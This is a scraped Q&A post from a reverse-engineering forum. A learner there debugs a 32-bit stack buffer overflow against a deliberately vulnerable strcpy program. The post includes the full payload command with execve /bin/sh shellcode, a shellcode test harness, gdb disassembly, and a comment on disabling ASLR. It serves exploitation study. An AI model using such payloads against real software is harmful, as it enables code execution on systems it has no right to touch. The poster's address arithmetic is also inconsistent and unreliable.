{
    "title": "Stack buffer overflow SIGSEGV help",
    "link": "https://reverseengineering.stackexchange.com/questions/16961/stack-buffer-overflow-sigsegv-help",
    "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <p>\n  I've been going at this for a couple of days now working through trial and error but I can't seem to pinpoint exactly why I'm still getting a SIGSEGV.\n </p>\n <p>\n  Here's the stdout of me stepping through the stack buffer overflow with gdb/gef:\n  <a href=\"https://hastebin.com/hunekowasi.bash\" rel=\"nofollow noreferrer\">\n   https://hastebin.com/hunekowasi.bash\n  </a>\n </p>\n <p>\n  The source for the c bin i'm executing is:\n </p>\n <pre><code>#include <stdio.h>\n#include <string.h>\n\nint main(int argc, char** argv) {\n    char buf[256];\n\n    if (argc < 2) {\n        fprintf(stderr, \"ERROR: argc < 2\");\n        return 1;\n    }\n\n    strcpy(buf, argv[1]);\n    return 0;\n}\n</code></pre>\n <p>\n  I compile it with:\n </p>\n <pre><code>gcc -g -Wall -fno-stack-protector -m32 -I. main.c -o overflow\n</code></pre>\n <p>\n  The machine im using has an 64 bit intel processor (little-endian), and I'm executing the\n  <code>\n   ./overflow\n  </code>\n  bin with this command:\n </p>\n <blockquote>\n  <p>\n   gdb -q --args ./overflow $(perl -e 'print \"\\x90\" x 236 . \"\\x6a\\x0b\\x58\\x31\\xf6\\x56\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x89\\xca\\xcd\\x80\" . \"\\xe8\\x9c\\xff\\xff\"')\n  </p>\n </blockquote>\n <p>\n  The char array im trying to overflow is 256 bytes (appears to be 260 bytes i believe).\n </p>\n <p>\n  <code>\n   0x080484ab <+69>:  lea    eax,[ebp-0x108]\n  </code>\n </p>\n <p>\n  This is verified when I intentionally try to segfault:\n </p>\n <pre><code>th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master⚡ \n⇒  ./overflow $(perl -e \"print 'A' x 256\")\nth3v0id@lenovo:~/repos/bufferoverflows/stack/01|master⚡ \n⇒  ./overflow $(perl -e \"print 'A' x 260\")\n[1]    18410 segmentation fault (core dumped)  ./overflow $(perl -e \"print 'A' x 260\")\n</code></pre>\n <p>\n  After verifying the segfault occurs at 260, I create my payload:\n </p>\n <ul>\n  <li>\n   NOP sled = 236 bytes\n  </li>\n  <li>\n   shellcode = 24 bytes\n  </li>\n </ul>\n <p>\n  I calculate for the jump by taking the beginning address of the buffer and adding 50 to it:\n  <code>\n   0xffff9cc0 + 50\n  </code>\n  giving\n  <code>\n   0xffff9c8e\n  </code>\n  which I reverse since I'm on a little-endian system and that ends up being:\n  <code>\n   \\x8e\\x9c\\xff\\xff\n  </code>\n  .\n </p>\n <p>\n  The shellcode im using is the same shellcode i use in this source to verify it works on my system:\n </p>\n <pre><code>#include <stdio.h>\n#include <string.h>\n\nchar shellcode[] = {\n    \"\\x6a\\x0b\"                      /* push   0xb */\n    \"\\x58\"                          /* pop    eax */\n    \"\\x31\\xf6\"                      /* xor    esi,esi */\n    \"\\x56\"                          /* push   esi */\n    \"\\x68\\x2f\\x2f\\x73\\x68\"          /* push   0x68732f2f */\n    \"\\x68\\x2f\\x62\\x69\\x6e\"          /* push   0x6e69622f */\n    \"\\x89\\xe3\"                      /* mov    ebx,esp */\n    \"\\x31\\xc9\"                      /* xor    ecx,ecx */\n    \"\\x89\\xca\"                      /* mov    edx,ecx */\n    \"\\xcd\\x80\"                      /* int    0x80 */\n};\n\nint main()\n{\n    printf(\"Shellcode Length:  %d\n\", (int)strlen(shellcode));\n    int (*ret)() = (int(*)())shellcode;\n    ret();\n    return 0;\n}\n</code></pre>\n <p>\n  Though.. When i execute the bin passing it the crafted string, i get a SIGSEGV error. I've played around with it quite a bit and can't seem to get it to work. I feel like im missing something small. You can see the output from gdb in the hastebin link i provided above.\n </p>\n <p>\n  edit - Adding some additional info that may be helpful.\n </p>\n <pre><code>@gef➤  checksec\n[+] checksec for '/home/th3v0id/repos/bufferoverflows/stack/01/overflow'\nCanary                        : No\nNX                            : No\nPIE                           : No\nFortify                       : No\nRelRO                         : Partial\n\n@gef➤  disassemble main\nDump of assembler code for function main:\n=> 0x08048466 <+0>: lea    ecx,[esp+0x4]\n   0x0804846a <+4>: and    esp,0xfffffff0\n   0x0804846d <+7>: push   DWORD PTR [ecx-0x4]\n   0x08048470 <+10>:    push   ebp\n   0x08048471 <+11>:    mov    ebp,esp\n   0x08048473 <+13>:    push   ecx\n   0x08048474 <+14>:    sub    esp,0x104\n   0x0804847a <+20>:    mov    eax,ecx\n   0x0804847c <+22>:    cmp    DWORD PTR [eax],0x1\n   0x0804847f <+25>:    jg     0x804849f <main+57>\n   0x08048481 <+27>:    mov    eax,ds:0x804a020\n   0x08048486 <+32>:    push   eax\n   0x08048487 <+33>:    push   0xf\n   0x08048489 <+35>:    push   0x1\n   0x0804848b <+37>:    push   0x8048554\n   0x08048490 <+42>:    call   0x8048330 <fwrite@plt>\n   0x08048495 <+47>:    add    esp,0x10\n   0x08048498 <+50>:    mov    eax,0x1\n   0x0804849d <+55>:    jmp    0x80484bf <main+89>\n   0x0804849f <+57>:    mov    eax,DWORD PTR [eax+0x4]\n   0x080484a2 <+60>:    add    eax,0x4\n   0x080484a5 <+63>:    mov    eax,DWORD PTR [eax]\n   0x080484a7 <+65>:    sub    esp,0x8\n   0x080484aa <+68>:    push   eax\n   0x080484ab <+69>:    lea    eax,[ebp-0x108]\n   0x080484b1 <+75>:    push   eax\n   0x080484b2 <+76>:    call   0x8048340 <strcpy@plt>\n   0x080484b7 <+81>:    add    esp,0x10\n   0x080484ba <+84>:    mov    eax,0x0\n   0x080484bf <+89>:    mov    ecx,DWORD PTR [ebp-0x4]\n   0x080484c2 <+92>:    leave  \n   0x080484c3 <+93>:    lea    esp,[ecx-0x4]\n   0x080484c6 <+96>:    ret    \nEnd of assembler dump.\n</code></pre>\n</div>\n</body></html>",
    "votes": "1",
    "answers": 0,
    "views": "353",
    "tags": [
        "disassembly",
        "assembly",
        "binary-analysis",
        "gdb",
        "buffer-overflow"
    ],
    "user": "SelfTaught",
    "time": "Dec 13, 2017 at 21:44",
    "comments": [
        {
            "user": "sudhackar",
            "text": "<html><body><span class=\"comment-copy\">\n What about ASLR? I'd advise against returning to stack addresses as they vary even with slight change in environment. look for useful \"gadgets\".\n</span>\n</body></html>",
            "time": null
        },
        {
            "user": "SelfTaught",
            "text": "<html><body><span class=\"comment-copy\">\n Thanks @sudhackar Your comment helped me figure out the issue, it was aslr. At first I didn't think that was the issue because in gef when i checked aslr previously, it reported as disabled (maybe it disables aslr by default? - need to dig into this more). Anyways,\n <code>\n  cat /proc/sys/kernel/randomize_va_space\n </code>\n output 2. set\n <code>\n  kernel.randomize_va_space = 0\n </code>\n in\n <code>\n  /etc/sysctl.cnf\n </code>\n , did a reboot, and now it works when i run it outside of gef.\n</span>\n</body></html>",
            "time": null
        }
    ],
    "answers_data": []
}